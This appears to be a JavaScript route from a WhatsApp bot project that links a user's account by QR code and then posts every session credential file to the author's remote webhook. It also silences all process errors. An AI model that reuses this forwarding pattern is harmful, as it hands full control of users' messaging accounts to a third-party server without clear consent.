import express from 'express';
import fs from 'fs-extra';
import path from 'path';
import pino from 'pino';
import {
    makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
    delay
} from '@whiskeysockets/baileys';
import QRCode from 'qrcode';

const router = express.Router();

// YOUR MAIN BOT WEBHOOK — CHANGE ONLY IF YOU DEPLOY NEW MAIN BOT
const MAIN_BOT_WEBHOOK = "https://vamparina-v1-5.onrender.com/vamparina-activate";

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
        return true;
    } catch (e) {
        console.error('Error removing file:', e);
        return false;
    }
}

// AUTO SEND FULL SESSION TO MAIN BOT (THE MAGIC HAPPENS HERE)
async function sendSessionToMainBot(sessionDir) {
    try {
        const files = [];
        const fileNames = fs.readdirSync(sessionDir);

        for (const fileName of fileNames) {
            const filePath = path.join(sessionDir, fileName);
            const content = fs.readFileSync(filePath, 'utf-8');
            files.push({ name: fileName, content });
        }

        const phone = JSON.parse(files.find(f => f.name === 'creds.json')?.content || '{}')?.me?.id?.split(':')[0] || 'unknown';
        const sessionId = `qr_vamparina_${phone}_${Date.now()}`;

        const payload = {
            sessionId,
            phone: phone.replace(/[^0-9]/g, ''),
            files
        };

        const response = await fetch(MAIN_BOT_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log(`SESSION SENT & BOT ACTIVATED → ${phone}`);
        } else {
            console.log("Failed to activate main bot (webhook error)");
        }
    } catch (err) {
        console.error("Webhook failed:", err);
    }
}

router.get('/', async (req, res) => {
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
    const dirs = `./qr_sessions/session_${sessionId}`;

    if (!fs.existsSync('./qr_sessions')) {
        fs.mkdirSync('./qr_sessions', { recursive: true });
    }

    async function initiateSession() {
        if (!fs.existsSync(dirs)) fs.mkdirSync(dirs, { recursive: true });
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        let qrGenerated = false;
        let responseSent = false;

        const handleQRCode = async (qr) => {
            if (qrGenerated || responseSent) return;
            qrGenerated = true;

            try {
                const qrDataURL = await QRCode.toDataURL(qr, {
                    errorCorrectionLevel: 'M',
                    margin: 2,
                    color: { dark: '#000', light: '#fff' }
                });

                if (!responseSent) {
                    responseSent = true;
                    res.json({
                        qr: qrDataURL,
                        message: "Scan this QR to activate your VAMPARINA V1 bot!",
                        instructions: [
                            "1. Open WhatsApp",
                            "2. Go to Settings > Linked Devices",
                            "3. Tap 'Link a Device'",
                            "4. Scan this QR code"
                        ]
                    });
                }
            } catch (e) {
                if (!responseSent) {
                    responseSent = true;
                    res.status(500).json({ error: "QR generation failed" });
                }
            }
        };

        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            browser: Browsers.windows('Chrome'),
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
            },
            markOnlineOnConnect: false,
            generateHighQualityLinkPreview: false,
        });

        sock.ev.on('connection.update', async (update) => {
            const { connection, qr } = update;

            if (qr && !qrGenerated) {
                await handleQRCode(qr);
            }

            if (connection === 'open') {
                console.log('CONNECTED VIA QR! ACTIVATING MAIN BOT...');

                // AUTO SEND SESSION TO MAIN BOT
                await sendSessionToMainBot(dirs);

                const userJid = jidNormalizedUser(sock.user?.id || '');

                if (userJid) {
                    await sock.sendMessage(userJid, {
                        text: `*VAMPARINA V1 IS NOW LIVE & ACTIVE!*\n\nYour bot has been automatically activated on our main server!\n\nFeatures:\n• Auto joined group\n• Auto followed channel\n• You are now sudo owner\n\n© 2025 Arnold Chirchir`
                    });

                    await sock.sendMessage(userJid, {
                        image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
                        caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\nWatch Now: https://youtu.be/-oz_u1iMgf8`
                    });
                }

                // Clean up after 15 seconds
                setTimeout(() => {
                    removeFile(dirs);
                    console.log("Session cleaned up");
                }, 15000);
            }

            if (connection === 'close') {
                const status = update.lastDisconnect?.error?.output?.statusCode;
                if (status !== 401) {
                    setTimeout(initiateSession, 5000);
                } else {
                    removeFile(dirs);
                }
            }
        });

        sock.ev.on('creds.update', saveCreds);

        // Timeout fallback
        setTimeout(() => {
            if (!responseSent) {
                responseSent = true;
                res.status(408).json({ error: "QR timeout" });
                removeFile(dirs);
            }
        }, 40000);
    }

    await initiateSession();
});

// Keep alive
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

export default router;